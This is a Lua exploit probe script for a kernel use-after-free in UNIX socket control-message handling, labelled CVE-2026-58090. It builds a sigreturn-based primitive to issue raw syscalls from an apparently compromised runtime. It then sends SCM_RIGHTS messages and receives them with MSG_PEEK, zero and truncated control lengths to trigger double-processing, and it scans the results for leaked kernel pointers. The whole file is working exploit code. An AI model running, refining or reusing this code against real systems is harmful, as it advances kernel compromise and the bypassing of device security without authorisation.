-- CRASH_CLASS: MODERATE
-- PROBE 151b: CVE-2026-58090 — MSG_PEEK double-process + CTRUNC trigger
--
-- The vulnerable path: receive path doesn't detach control messages
-- from socket buffer before processing. Error paths free but leave
-- freed mbufs in the buffer.
--
-- Test A: MSG_PEEK on SCM_RIGHTS, then normal recv (double-process)
-- Test B: Receive with controllen=0 (CTRUNC, cmsg dropped)
-- Test C: Receive with tiny controllen (partial cmsg)

print("=== PROBE 151b: UNIX UAF ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [A] MSG_PEEK then normal receive (double-process cmsg)
print("--- [A] PEEK+RECV ---")
local sv = gpu + 0x1000
wq(sv, uint64(0))
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
print("pair=" .. (sp and tostring(to_num(sp)) or "nil"))

if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))
    print("s0=" .. s0 .. " s1=" .. s1)

    -- Create test fd (pipe read end)
    local prd_r = srop(42)
    local prd = prd_r and to_num(prd_r) or -1
    local pwr = prd + 1
    print("pipe=" .. prd .. "," .. pwr)

    if prd >= 0 then
        -- Build sendmsg with SCM_RIGHTS
        local mh = gpu + 0x2000
        local iv = gpu + 0x2100
        local cm = gpu + 0x2200
        local io = gpu + 0x2300

        wd(io, 0x41)
        wq(iv, ga(0x2300))
        wq(iv + 8, uint64(1))
        for off = 0, 31, 4 do wd(cm + off, 0) end
        wd(cm, 20)
        wd(cm + 4, 0xFFFF)
        wd(cm + 8, 1)
        wd(cm + 16, prd)

        wq(mh, uint64(0))
        wd(mh + 8, 0)
        wq(mh + 0x10, ga(0x2100))
        wd(mh + 0x18, 1)
        wq(mh + 0x20, ga(0x2200))
        wd(mh + 0x28, 24)
        wd(mh + 0x30, 0)

        local sr = srop(28, uint64(s0), ga(0x2000), uint64(0))
        print("send=" .. (sr and tostring(to_num(sr)) or "nil"))

        -- MSG_PEEK receive (flag 0x2)
        local rmh = gpu + 0x3000
        local riv = gpu + 0x3100
        local rcm = gpu + 0x3200
        local rio = gpu + 0x3300

        wq(rio, uint64(0))
        wq(riv, ga(0x3300))
        wq(riv + 8, uint64(64))
        for off = 0, 63, 4 do wd(rcm + off, 0xDEADDEAD) end

        wq(rmh, uint64(0))
        wd(rmh + 8, 0)
        wq(rmh + 0x10, ga(0x3100))
        wd(rmh + 0x18, 1)
        wq(rmh + 0x20, ga(0x3200))
        wd(rmh + 0x28, 64)
        wd(rmh + 0x30, 0)

        local pr = srop(27, uint64(s1), ga(0x3000), uint64(2))
        print("peek=" .. (pr and tostring(to_num(pr)) or "nil"))

        local pcl = to_num(memory.read_dword(rcm))
        local pfd = to_num(memory.read_dword(rcm + 16))
        local pflags = to_num(memory.read_dword(rmh + 0x30))
        print("peek_cmsg_len=" .. pcl .. " peek_fd=" .. pfd .. " flags=0x" .. string.format("%X", pflags))

        -- Close peek fd if valid
        if pfd > 0 and pfd < 256 and pfd ~= 0xDEADDEAD then
            srop(6, uint64(pfd))
            print("closed_peek_fd")
        end

        -- Normal receive (message should still be in buffer)
        local rmh2 = gpu + 0x4000
        local riv2 = gpu + 0x4100
        local rcm2 = gpu + 0x4200
        local rio2 = gpu + 0x4300

        wq(rio2, uint64(0))
        wq(riv2, ga(0x4300))
        wq(riv2 + 8, uint64(64))
        for off = 0, 63, 4 do wd(rcm2 + off, 0xBBBBBBBB) end

        wq(rmh2, uint64(0))
        wd(rmh2 + 8, 0)
        wq(rmh2 + 0x10, ga(0x4100))
        wd(rmh2 + 0x18, 1)
        wq(rmh2 + 0x20, ga(0x4200))
        wd(rmh2 + 0x28, 64)
        wd(rmh2 + 0x30, 0)

        local nr = srop(27, uint64(s1), ga(0x4000), uint64(0))
        print("recv=" .. (nr and tostring(to_num(nr)) or "nil"))

        local ncl = to_num(memory.read_dword(rcm2))
        local nfd = to_num(memory.read_dword(rcm2 + 16))
        local nflags = to_num(memory.read_dword(rmh2 + 0x30))
        print("recv_cmsg_len=" .. ncl .. " recv_fd=" .. nfd .. " flags=0x" .. string.format("%X", nflags))

        -- Scan for kernel pointers
        for off = 0, 56, 8 do
            local ok2, v = pcall(function() return memory.read_qword(rcm2 + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("*** KPTR recv+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end

        if nfd > 0 and nfd < 256 and nfd ~= 0xBBBBBBBB then
            srop(6, uint64(nfd))
        end
        srop(6, uint64(prd))
        srop(6, uint64(pwr))
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [B] CTRUNC: receive SCM_RIGHTS with controllen=0
print("")
print("--- [B] CTRUNC ---")
wq(sv, uint64(0))
sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    local prd_r = srop(42)
    local prd = prd_r and to_num(prd_r) or -1

    if prd >= 0 then
        -- Send SCM_RIGHTS
        local mh = gpu + 0x5000
        local iv = gpu + 0x5100
        local cm = gpu + 0x5200
        local io = gpu + 0x5300

        wd(io, 0x42)
        wq(iv, ga(0x5300))
        wq(iv + 8, uint64(1))
        for off = 0, 31, 4 do wd(cm + off, 0) end
        wd(cm, 20)
        wd(cm + 4, 0xFFFF)
        wd(cm + 8, 1)
        wd(cm + 16, prd)

        wq(mh, uint64(0))
        wd(mh + 8, 0)
        wq(mh + 0x10, ga(0x5100))
        wd(mh + 0x18, 1)
        wq(mh + 0x20, ga(0x5200))
        wd(mh + 0x28, 24)
        wd(mh + 0x30, 0)

        srop(28, uint64(s0), ga(0x5000), uint64(0))

        -- Receive with controllen=0
        local rmh = gpu + 0x6000
        local riv = gpu + 0x6100
        local rcm = gpu + 0x6200
        local rio = gpu + 0x6300

        wq(rio, uint64(0))
        wq(riv, ga(0x6300))
        wq(riv + 8, uint64(64))

        wq(rmh, uint64(0))
        wd(rmh + 8, 0)
        wq(rmh + 0x10, ga(0x6100))
        wd(rmh + 0x18, 1)
        wq(rmh + 0x20, ga(0x6200))
        wd(rmh + 0x28, 0)  -- controllen=0, triggers CTRUNC
        wd(rmh + 0x30, 0)

        local cr = srop(27, uint64(s1), ga(0x6000), uint64(0))
        local crv = cr and to_num(cr) or -1
        local cflags = to_num(memory.read_dword(rmh + 0x30))
        print("ctrunc_recv=" .. crv .. " flags=0x" .. string.format("%X", cflags))

        -- MSG_CTRUNC = 0x20
        if cflags >= 0x20 then print("*** MSG_CTRUNC ***") end

        -- Send another plain byte (no cmsg)
        wd(gpu + 0x7000, 0x43)
        srop(4, uint64(s0), ga(0x7000), uint64(1))

        -- Receive it — check for stale cmsg data from freed mbuf
        for off = 0, 127, 4 do wd(rcm + off, 0xCCCCCCCC) end

        wq(rmh + 0x20, ga(0x6200))
        wd(rmh + 0x28, 128)
        wd(rmh + 0x30, 0)

        local cr2 = srop(27, uint64(s1), ga(0x6000), uint64(0))
        local cr2v = cr2 and to_num(cr2) or -1
        local rctl = to_num(memory.read_dword(rmh + 0x28))
        print("after_ctrunc=" .. cr2v .. " controllen=" .. rctl)

        -- Dump any non-sentinel values in cmsg area
        local mod = 0
        for off = 0, 124, 4 do
            local v = to_num(memory.read_dword(rcm + off))
            if v ~= 0xCCCCCCCC and v ~= 0 then
                mod = mod + 1
                if mod <= 8 then
                    print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                end
            end
        end

        -- Kernel pointer scan
        for off = 0, 120, 8 do
            local ok2, v = pcall(function() return memory.read_qword(rcm + off) end)
            if ok2 then
                local h, l = get_hi_lo(v)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print("*** KPTR ctrunc+" .. string.format("%02X", off) .. "=0x" .. string.format("%X%08X", h, l))
                end
            end
        end

        srop(6, uint64(prd))
        srop(6, uint64(prd + 1))
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [C] Partial controllen (between 0 and CMSG_LEN)
print("")
print("--- [C] PARTIAL ---")
wq(sv, uint64(0))
sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    local prd_r = srop(42)
    local prd = prd_r and to_num(prd_r) or -1
    if prd >= 0 then
        local sizes = {4, 8, 12, 16, 19}
        for si = 1, 5 do
            local sz = sizes[si]

            -- Send SCM_RIGHTS
            local mh = gpu + 0x8000
            local iv = gpu + 0x8100
            local cm = gpu + 0x8200
            local io = gpu + 0x8300

            wd(io, 0x44 + si)
            wq(iv, ga(0x8300))
            wq(iv + 8, uint64(1))
            for off = 0, 31, 4 do wd(cm + off, 0) end
            wd(cm, 20)
            wd(cm + 4, 0xFFFF)
            wd(cm + 8, 1)
            wd(cm + 16, prd)

            wq(mh, uint64(0))
            wd(mh + 8, 0)
            wq(mh + 0x10, ga(0x8100))
            wd(mh + 0x18, 1)
            wq(mh + 0x20, ga(0x8200))
            wd(mh + 0x28, 24)
            wd(mh + 0x30, 0)

            srop(28, uint64(s0), ga(0x8000), uint64(0))

            -- Receive with small controllen
            local rmh = gpu + 0x9000
            local riv = gpu + 0x9100
            local rcm = gpu + 0x9200
            local rio = gpu + 0x9300

            wq(rio, uint64(0))
            wq(riv, ga(0x9300))
            wq(riv + 8, uint64(64))
            for off = 0, 31, 4 do wd(rcm + off, 0xAAAAAAAA) end

            wq(rmh, uint64(0))
            wd(rmh + 8, 0)
            wq(rmh + 0x10, ga(0x9100))
            wd(rmh + 0x18, 1)
            wq(rmh + 0x20, ga(0x9200))
            wd(rmh + 0x28, sz)
            wd(rmh + 0x30, 0)

            local rr = srop(27, uint64(s1), ga(0x9000), uint64(0))
            local rrv = rr and to_num(rr) or -1
            local rf = to_num(memory.read_dword(rmh + 0x30))
            local rc = to_num(memory.read_dword(rmh + 0x28))
            print("ctl=" .. sz .. " r=" .. rrv .. " f=0x" .. string.format("%X", rf) .. " rc=" .. rc)
        end

        srop(6, uint64(prd))
        srop(6, uint64(prd + 1))
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
